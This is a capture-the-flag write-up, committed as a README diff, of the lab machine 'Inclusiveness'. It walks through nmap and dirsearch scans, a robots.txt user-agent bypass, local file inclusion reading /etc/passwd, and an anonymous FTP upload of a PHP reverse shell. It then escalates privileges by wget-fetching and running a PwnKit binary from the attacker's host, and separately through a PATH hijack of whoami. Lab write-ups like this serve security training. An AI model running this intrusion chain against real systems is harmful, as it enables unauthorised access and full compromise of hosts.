@@ -1,0 +1,265 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>README.md</title>
+</head><body>IP - 10.0.2.27<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+nmap result<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/offensive_security_playground/INCLUSIVENESS]<br/>
+└─# nmap -sC -sV 10.0.2.27 -p- -oN nmap_all_port.txt<br/>
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-16 20:46 +0630<br/>
+Nmap scan report for 10.0.2.27<br/>
+Host is up (0.00078s latency).<br/>
+Not shown: 65532 closed tcp ports (reset)<br/>
+PORT &nbsp; STATE SERVICE VERSION<br/>
+21/tcp open &nbsp;ftp &nbsp; &nbsp; vsftpd 3.0.3<br/>
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)<br/>
+|_drwxrwxrwx &nbsp; &nbsp;2 0 &nbsp; &nbsp; &nbsp; &nbsp;0 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;4096 Feb 08 &nbsp;2020 pub [NSE: writeable]<br/>
+| ftp-syst: <br/>
+| &nbsp; STAT: <br/>
+| FTP server status:<br/>
+| &nbsp; &nbsp; &nbsp;Connected to ::ffff:10.0.2.4<br/>
+| &nbsp; &nbsp; &nbsp;Logged in as ftp<br/>
+| &nbsp; &nbsp; &nbsp;TYPE: ASCII<br/>
+| &nbsp; &nbsp; &nbsp;No session bandwidth limit<br/>
+| &nbsp; &nbsp; &nbsp;Session timeout in seconds is 300<br/>
+| &nbsp; &nbsp; &nbsp;Control connection is plain text<br/>
+| &nbsp; &nbsp; &nbsp;Data connections will be plain text<br/>
+| &nbsp; &nbsp; &nbsp;At session startup, client count was 4<br/>
+| &nbsp; &nbsp; &nbsp;vsFTPd 3.0.3 - secure, fast, stable<br/>
+|_End of status<br/>
+22/tcp open &nbsp;ssh &nbsp; &nbsp; OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)<br/>
+| ssh-hostkey: <br/>
+| &nbsp; 2048 061ba39283a57a15bd406e0c8d98277b (RSA)<br/>
+| &nbsp; 256 cb3883261a9fd35dd3fe9ba1d3bcab2c (ECDSA)<br/>
+|_ &nbsp;256 6554fc2d12ace184783e0023fbe4c9ee (ED25519)<br/>
+80/tcp open &nbsp;http &nbsp; &nbsp;Apache httpd 2.4.38 ((Debian))<br/>
+|_http-title: Apache2 Debian Default Page: It works<br/>
+|_http-server-header: Apache/2.4.38 (Debian)<br/>
+MAC Address: 08:00:27:93:6F:46 (Oracle VirtualBox virtual NIC)<br/>
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br/>
+<br/>
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br/>
+Nmap done: 1 IP address (1 host up) scanned in 33.99 seconds<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+┌──(root㉿kali)-[~]<br/>
+└─# dirsearch -u http://10.0.2.27/ -e php -f -x 400,403<br/>
+<br/>
+&nbsp; _|. _ _ &nbsp;_ &nbsp;_ &nbsp;_ _|_ &nbsp; &nbsp;v0.4.2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+&nbsp;(_||| _) (/_(_|| (_| ) &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 13441<br/>
+<br/>
+Output File: /root/.dirsearch/reports/10.0.2.27/-_23-02-16_23-51-06.txt<br/>
+<br/>
+Error Log: /root/.dirsearch/logs/errors-23-02-16_23-51-06.log<br/>
+<br/>
+Target: http://10.0.2.27/<br/>
+<br/>
+[23:51:06] Starting: <br/>
+[23:51:09] 200 - &nbsp; 59B &nbsp;- /.robots.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[23:51:43] 200 - &nbsp; 10KB - /index.html &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[23:51:44] 301 - &nbsp;311B &nbsp;- /javascript &nbsp;-&gt; &nbsp;http://10.0.2.27/javascript/ &nbsp; &nbsp; <br/>
+[23:51:48] 301 - &nbsp;307B &nbsp;- /manual &nbsp;-&gt; &nbsp;http://10.0.2.27/manual/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[23:51:48] 200 - &nbsp;626B &nbsp;- /manual/ &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+[23:51:48] 200 - &nbsp;626B &nbsp;- /manual/index.html<br/>
+[23:51:57] 200 - &nbsp; 59B &nbsp;- /public_html/robots.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[23:51:59] 200 - &nbsp; 59B &nbsp;- /robots.txt &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+[23:51:59] 200 - &nbsp; 59B &nbsp;- /robots.txt.dist<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Task Completed<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+I access the robots.txt file but found this message:<br/>
+<br/>
+You are not a search engine! You can't read my robots.txt! <br/>
+<br/>
+It's mean I need to bypass the User-agent restriction. So, I research about bypass and found this article:<br/>
+<br/>
+https://support.google.com/merchants/answer/6098154?hl=en<br/>
+<br/>
+bypass payload is below <br/>
+<br/>
+User-agent: Googlebot<br/>
+Disallow:<br/>
+<br/>
+I need to edit the request with burpsuite so I open burpsuite and catch with intercept and then edit the User-agent and Accept into Disallow then forward the request.<br/>
+<br/>
+Boom! I got secret directory:<br/>
+<br/>
+User-agent: *<br/>
+Disallow: /secret_information/<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+http://10.0.2.27/secret_information/<br/>
+<br/>
+In this page, I found LFI vulnerability after changing the language.<br/>
+<br/>
+http://10.0.2.27/secret_information/?lang=/etc/passwd<br/>
+<br/>
+root:x:0:0:root:/root:/bin/bash<br/>
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin<br/>
+bin:x:2:2:bin:/bin:/usr/sbin/nologin<br/>
+sys:x:3:3:sys:/dev:/usr/sbin/nologin<br/>
+sync:x:4:65534:sync:/bin:/bin/sync<br/>
+games:x:5:60:games:/usr/games:/usr/sbin/nologin<br/>
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin<br/>
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin<br/>
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin<br/>
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin<br/>
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin<br/>
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin<br/>
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin<br/>
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin<br/>
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin<br/>
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin<br/>
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin<br/>
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin<br/>
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin<br/>
+systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin<br/>
+systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin<br/>
+systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin<br/>
+messagebus:x:104:110::/nonexistent:/usr/sbin/nologin<br/>
+tss:x:105:111:TPM2 software stack,,,:/var/lib/tpm:/bin/false<br/>
+dnsmasq:x:106:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin<br/>
+avahi-autoipd:x:107:114:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin<br/>
+usbmux:x:108:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin<br/>
+rtkit:x:109:115:RealtimeKit,,,:/proc:/usr/sbin/nologin<br/>
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin<br/>
+avahi:x:113:120:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin<br/>
+saned:x:114:121::/var/lib/saned:/usr/sbin/nologin<br/>
+colord:x:115:122:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin<br/>
+geoclue:x:116:123::/var/lib/geoclue:/usr/sbin/nologin<br/>
+tom:x:1000:1000:Tom,,,:/home/tom:/bin/bash<br/>
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin<br/>
+ftp:x:118:125:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin<br/>
+<br/>
+<br/>
+Found Username "tom".<br/>
+<br/>
+I search ftp directory from ftp config file:<br/>
+<br/>
+view-source:http://10.0.2.27/secret_information/?lang=/etc/vsftpd.conf<br/>
+<br/>
+# Point users at the directory we created earlier.<br/>
+anon_root=/var/ftp/<br/>
+write_enable=YES<br/>
+<br/>
+Found ftp directory<br/>
+/var/ftp/<br/>
+<br/>
+Now, I know where ftp directory and found LFI vulnerability so I login into ftp as anonymous and then I upload my pentest monkey php reverse shell with "put" command.<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/php-reverse-shell]<br/>
+└─# ftp 10.0.2.27 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; <br/>
+Connected to 10.0.2.27.<br/>
+220 (vsFTPd 3.0.3)<br/>
+Name (10.0.2.27:root): anonymous<br/>
+331 Please specify the password.<br/>
+Password: <br/>
+230 Login successful.<br/>
+Remote system type is UNIX.<br/>
+Using binary mode to transfer files.<br/>
+ftp&gt; cd pub<br/>
+250 Directory successfully changed.<br/>
+ftp&gt; put shell.php<br/>
+local: shell.php remote: shell.php<br/>
+229 Entering Extended Passive Mode (|||47369|)<br/>
+150 Ok to send data.<br/>
+100% |****************************************************************************************| &nbsp;5490 &nbsp; &nbsp; &nbsp; &nbsp;6.50 MiB/s &nbsp; &nbsp;00:00 ETA<br/>
+226 Transfer complete.<br/>
+5490 bytes sent in 00:00 (1.75 MiB/s)<br/>
+ftp&gt; exit<br/>
+221 Goodbye.<br/>
+<br/>
+I access this file from here:<br/>
+<br/>
+http://10.0.2.27/secret_information/?lang=/var/ftp/pub/shell.php<br/>
+<br/>
+Boom! I got reverse shell.<br/>
+<br/>
+<br/>
+---------------------------------------------------------------------------------------------------------------------<br/>
+<br/>
+Privilege Escaltion (PwnKit)<br/>
+<br/>
+I check the kernel and found this machine vulnerable into PwnKit:<br/>
+<br/>
+My Machine:<br/>
+<br/>
+┌──(root㉿kali)-[~/Desktop/tools/Pwnkit]<br/>
+└─# python2 -m SimpleHTTPServer 80 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;<br/>
+Serving HTTP on 0.0.0.0 port 80 ...<br/>
+10.0.2.27 - - [17/Feb/2023 02:58:58] "GET /PwnKit HTTP/1.1" 200 -<br/>
+<br/>
+Victim Machine:<br/>
+<br/>
+www-data@inclusiveness:/tmp$ wget http://10.0.2.4/PwnKit<br/>
+--2023-02-17 06:28:59-- &nbsp;http://10.0.2.4/PwnKit<br/>
+Connecting to 10.0.2.4:80... connected.<br/>
+HTTP request sent, awaiting response... 200 OK<br/>
+Length: 16800 (16K) [application/octet-stream]<br/>
+Saving to: 'PwnKit'<br/>
+<br/>
+PwnKit &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;100%[===================&gt;] &nbsp;16.41K &nbsp;--.-KB/s &nbsp; &nbsp;in 0.01s &nbsp; <br/>
+<br/>
+2023-02-17 06:28:59 (1.11 MB/s) - 'PwnKit' saved [16800/16800]<br/>
+<br/>
+www-data@inclusiveness:/tmp$ chmod +x PwnKit <br/>
+www-data@inclusiveness:/tmp$ ./PwnKit <br/>
+root@inclusiveness:/tmp# whoami<br/>
+root<br/>
+<br/>
+Root Flag For vulhub<br/>
+<br/>
+root@inclusiveness:~# cat flag.txt <br/>
+|\---------------\<br/>
+|| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
+|| UQ Cyber Squad | &nbsp; &nbsp; &nbsp; <br/>
+|| &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;|<br/>
+|\~~~~~~~~~~~~~~~\<br/>
+|<br/>
+|<br/>
+|<br/>
+|<br/>
+o<br/>
+<br/>
+flag{omg_you_did_it_YAY}<br/>
+<br/>
+Another way to Privilege Escalation (PATH Variable Exploit)<br/>
+<br/>
+I found whoami binary is call from this executable file so I create clone whoami binary file with this payload at tmp directory:<br/>
+<br/>
+echo "printf "tom"" &gt; whoami (this binary will print out "tom")<br/>
+<br/>
+<br/>
+now, need to export this tmp directory into PATH because normally binary files are run from /bin/usr/ so I need to abusive this PATH into our malicious directory after that rootshell whoami will call our clone whoami binary.<br/>
+<br/>
+export PATH=/tmp:$PATH<br/>
+<br/>
+And then give permission<br/>
+<br/>
+chmod +x whoami<br/>
+<br/>
+Now, run the file:<br/>
+<br/>
+<br/>
+www-data@inclusiveness:/tmp$ /home/tom/rootshell <br/>
+checking if you are tom...<br/>
+you are: tom<br/>
+access granted.<br/>
+# (Now I am root)<br/>
+<br/>
+# cat proof.txt (For Offensive Security playground lab)<br/>
+0465694d4654100f96a8b671a5db70a9<br/>
+<br/>
+<br/>
+</body></html>
